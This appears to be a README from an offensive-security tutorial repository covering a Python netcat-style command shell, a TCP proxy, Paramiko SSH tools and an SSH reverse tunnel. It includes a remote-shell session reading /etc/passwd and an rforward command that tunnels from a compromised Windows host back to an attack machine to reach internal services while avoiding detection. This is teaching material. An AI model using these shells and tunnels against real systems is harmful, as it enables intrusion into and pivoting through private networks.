# TCP servers, shells and proxies

In some cases, being able to create our own TCP servers for writing command shells or crafting a proxy brings us the advantage.

## Netcat replacement

Netcat is the utility knife of networking, so it is no surprise that systems administrators remove it from their systems. Such a useful [netcat.py](netcat.py) tool would be quite an asset if an attacker managed to find a way in.

First terminal (server):

    $ python netcat.py -t 192.168.122.108 -p 5555 -l -c                  
    [*] Listening on 192.168.122.108:5555
    [*] Connection from ('192.168.122.108', 38332)
    [*] Running command "cat /etc/passwd"
    [*] Output: b'root:[...]

Second terminal (client):

    $ python netcat.py -t 192.168.122.108 -p 5555
    Go for it!
    netcatsh > 
    cat /etc/passwd
    root:[...]
    
## TCP Proxy

There are many reasons to have a [tcp_proxy.py](tcp_proxy.py) in our tool belt: forwarding traffic to bounce from host to host, or for assessing network-based software.

    usage: proxy.py [-h] [-c CLIENT] [-o CLIENTPORT] -t TARGET -p TARGETPORT
                    [-r RECEIVE_FIRST]
    proxy.py: error: the following arguments are required: -t/--target, -p/--port

Note: Use sudo with port 21 because it is a privileged port, so listening on it
requires administrative or root privileges.

## SSH server and client

It can be wise to encrypt traffic to avoid detection using Secure Shell (SSH). The target may not have an SSH client (Windows systems usually do not).

With Python, raw sockets and some crypto magic can be used to create an SSH client and server. The Paramiko library uses PyCrypto, and provides simple access to the SSH2 protocol.

The [ssh_server.py](ssh_server.py) and [ssh_client.py](ssh_client.py)) and [ssh_proxy.py](ssh_proxy.py) scripts are for learning to use Paramiko to make a connection and run a command on an SSH system, configure an SSH server and SSH client to run remote commands on a Windows machine, and puzzle out the reverse tunnel demo file included with Paramiko to duplicate the proxy.py option made earlier (also in this directory).

On one machine (for example a Windows machine) start the server:

    $ python ssh_server.py
    [+] Listening for connection ... 

On another machine start up the client:

    $ python ssh_client.py
    Password:

## SSH reverse tunnel with Paramiko

Imagine having remote access to an SSH server on an internal network, but no direct access to the web server on the same network. The server with SSH installed does have access, but this SSH server doesn’t have the tools we'd like to use.

One way to overcome this problem is to set up a forward SSH tunnel.

    ssh -L 8008:web:80 username@sshserver

Alas, not many Windows systems are running an SSH server service. Instead, configure a reverse SSH tunneling connection: Set up an [SSH server](ssh_server.py) on attack machine and connect back to it from the Windows [SSH client](ssh_client.py) and through that SSH connection, specify a remote port on the SSH server that gets tunneled to the local host and port.

These then can be used to expose port 3389 to access an internal system using Remote Desktop or to access another system that the Windows client can access (like the web server).

The Paramiko demo files include a file called `rforward.py` that does exactly this (transport mode of Paramiko).

Run `rforward.py` from the Windows system and configure it to be the middleman to be able to tunnel traffic from a web server to the Kali SSH server.

    python rforward.py [SSH server address] -p 8081 -r [Web server address]:3000 --user=tim --password
    Enter SSH password:
    Connecting to ssh host [SSH server address]:22 . . .
    Now forwarding remote port 8081 to [Web server address]:3000 . . .
    
Now browse to http://127.0.0.1:8081 on the Linux server, and connect to the web server at
192.168.1.207:3000 through the SSH tunnel.

Flip back to the Windows machine to see the connection being made in Paramiko:

    Connected! Tunnel open ('127.0.0.1', 54690) -> ('SSH server address', 22) -> ('Web server address', 3000)
